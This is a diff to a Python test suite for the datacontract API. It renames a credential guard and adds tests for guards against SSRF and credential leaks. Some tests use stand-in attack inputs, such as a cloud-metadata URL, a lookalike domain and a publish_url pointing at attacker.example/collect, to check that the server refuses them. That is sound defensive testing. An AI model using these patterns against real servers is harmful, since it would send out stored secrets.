@@ -418,7 +418,7 @@ def test_cross_origin_preflight_is_not_approved():
 
 # --- B1/C1: an environment-held credential must not be sent to a contract-chosen host ---
 
-from datacontract.api import _reject_ambient_credentials_to_untrusted_host  # noqa: E402
+from datacontract.api import _reject_environment_credentials_to_untrusted_host  # noqa: E402
 from datacontract.config import Config  # noqa: E402
 
 _POSTGRES_CONTRACT = """\
@@ -453,7 +453,7 @@ def test_guard_blocks_env_credential_to_contract_host(monkeypatch):
     from fastapi import HTTPException
 
     with pytest.raises(HTTPException) as exc:
-        _reject_ambient_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)
+        _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)
     assert exc.value.status_code == 422
     assert "DATACONTRACT_POSTGRES_HOST" in exc.value.detail
 
@@ -463,22 +463,22 @@ def test_guard_allows_when_operator_pins_the_host(monkeypatch):
     contract's host is ignored and the connection is allowed."""
     monkeypatch.setenv("DATACONTRACT_POSTGRES_PASSWORD", "prod-secret")
     monkeypatch.setenv("DATACONTRACT_POSTGRES_HOST", "db.internal")
-    _reject_ambient_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise
+    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise
 
 
-def test_guard_allows_when_no_ambient_secret(monkeypatch):
+def test_guard_allows_when_no_environment_secret(monkeypatch):
     """No environment-held credential -> nothing to protect, connection allowed."""
     monkeypatch.delenv("DATACONTRACT_POSTGRES_PASSWORD", raising=False)
     monkeypatch.delenv("DATACONTRACT_POSTGRES_HOST", raising=False)
-    _reject_ambient_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise
+    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise
 
 
 def test_guard_allows_caller_supplied_credentials(monkeypatch):
     """A caller who brings the whole credential set via request config may aim it
-    at their own host -- only the server's ambient secret is pinned (C1)."""
+    at their own host -- only the server's environment secret is pinned (C1)."""
     monkeypatch.delenv("DATACONTRACT_POSTGRES_PASSWORD", raising=False)
     config = Config.resolve({"DATACONTRACT_POSTGRES_PASSWORD": "caller-secret"})
-    _reject_ambient_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", config)  # no raise
+    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", config)  # no raise
 
 
 def test_test_endpoint_blocks_credential_exfiltration(monkeypatch):
@@ -541,11 +541,105 @@ def test_guard_blocks_env_kafka_password(monkeypatch):
     from fastapi import HTTPException
 
     with pytest.raises(HTTPException) as exc:
-        _reject_ambient_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)
+        _reject_environment_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)
     assert exc.value.status_code == 422
     assert "kafka" in exc.value.detail
 
 
-def test_guard_allows_kafka_without_ambient_secret(monkeypatch):
+def test_guard_allows_kafka_without_environment_secret(monkeypatch):
     monkeypatch.delenv("DATACONTRACT_KAFKA_SASL_PASSWORD", raising=False)
-    _reject_ambient_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)  # no raise
+    _reject_environment_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)  # no raise
+
+
+# --- publish_url is restricted to environment-pinned platform URLs ---
+
+from datacontract.api import (  # noqa: E402
+    _reject_request_platform_host_with_environment_key,
+    _reject_unpinned_publish_url,
+)
+
+_PLATFORM_ENV_VARS = (
+    "ENTROPY_DATA_HOST",
+    "DATAMESH_MANAGER_HOST",
+    "DATACONTRACT_MANAGER_HOST",
+    "ENTROPY_DATA_API_KEY",
+    "DATAMESH_MANAGER_API_KEY",
+    "DATACONTRACT_MANAGER_API_KEY",
+)
+
+
+@pytest.fixture
+def clean_platform_env(monkeypatch):
+    for var in _PLATFORM_ENV_VARS:
+        monkeypatch.delenv(var, raising=False)
+    return monkeypatch
+
+
+def test_publish_url_platform_domains_allowed(clean_platform_env):
+    """The built-in platform domains work without any configuration, subdomains included."""
+    _reject_unpinned_publish_url("https://api.entropy-data.com/api/test-results")  # no raise
+    _reject_unpinned_publish_url("https://mydomain.entropy-data.com/api/test-results")  # no raise
+    _reject_unpinned_publish_url("https://api.datamesh-manager.com/api/test-results")  # no raise
+    _reject_unpinned_publish_url(None)  # no publish requested
+
+
+def test_publish_url_arbitrary_host_refused(clean_platform_env):
+    """The SSRF primitive: the run must not be POSTed to a caller-chosen host."""
+    from fastapi import HTTPException
+
+    with pytest.raises(HTTPException) as exc:
+        _reject_unpinned_publish_url("http://10.0.0.5:8080/latest/meta-data")
+    assert exc.value.status_code == 422
+    assert "ENTROPY_DATA_HOST" in exc.value.detail
+    with pytest.raises(HTTPException):
+        _reject_unpinned_publish_url("https://evilentropy-data.com/api/test-results")  # no subdomain dot
+
+
+def test_publish_url_environment_configured_host_allowed(clean_platform_env):
+    clean_platform_env.setenv("ENTROPY_DATA_HOST", "https://dcm.mycompany.example")
+    _reject_unpinned_publish_url("https://dcm.mycompany.example/api/test-results")  # no raise
+
+
+def test_publish_url_header_host_does_not_widen(clean_platform_env):
+    """A per-request entropy-data-host header must not make its host an allowed
+    publish target -- the guard is refused pre-flight, before any test runs."""
+    response = client.post(
+        url="/test?publish_url=https://attacker.example/collect",
+        json="apiVersion: v3.0.2",
+        headers={"entropy-data-host": "https://attacker.example"},
+    )
+    assert response.status_code == 422
+    assert "ENTROPY_DATA_HOST" in response.json()["detail"]
+
+
+# --- the environment-held platform API key must not follow a request-chosen host ---
+
+
+def test_platform_guard_blocks_env_key_with_header_host(clean_platform_env):
+    """The exploit: server holds the platform key in its env, the request names the
+    platform host -> the key would be sent to the request's host, so refuse."""
+    from fastapi import HTTPException
+
+    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
+    with pytest.raises(HTTPException) as exc:
+        _reject_request_platform_host_with_environment_key({"ENTROPY_DATA_HOST": "https://attacker.example"})
+    assert exc.value.status_code == 422
+    assert "ENTROPY_DATA_HOST" in exc.value.detail
+
+
+def test_platform_guard_allows_env_key_with_env_host(clean_platform_env):
+    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
+    clean_platform_env.setenv("ENTROPY_DATA_HOST", "https://dcm.mycompany.example")
+    _reject_request_platform_host_with_environment_key(None)  # no raise
+
+
+def test_platform_guard_allows_caller_supplied_key_and_host(clean_platform_env):
+    """A caller who brings the key itself may aim it wherever they like."""
+    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
+    _reject_request_platform_host_with_environment_key(
+        {"ENTROPY_DATA_API_KEY": "callers-own-key", "ENTROPY_DATA_HOST": "https://their.example"}
+    )  # no raise
+
+
+def test_platform_guard_allows_without_environment_key(clean_platform_env):
+    _reject_request_platform_host_with_environment_key({"ENTROPY_DATA_HOST": "https://their.example"})  # no raise
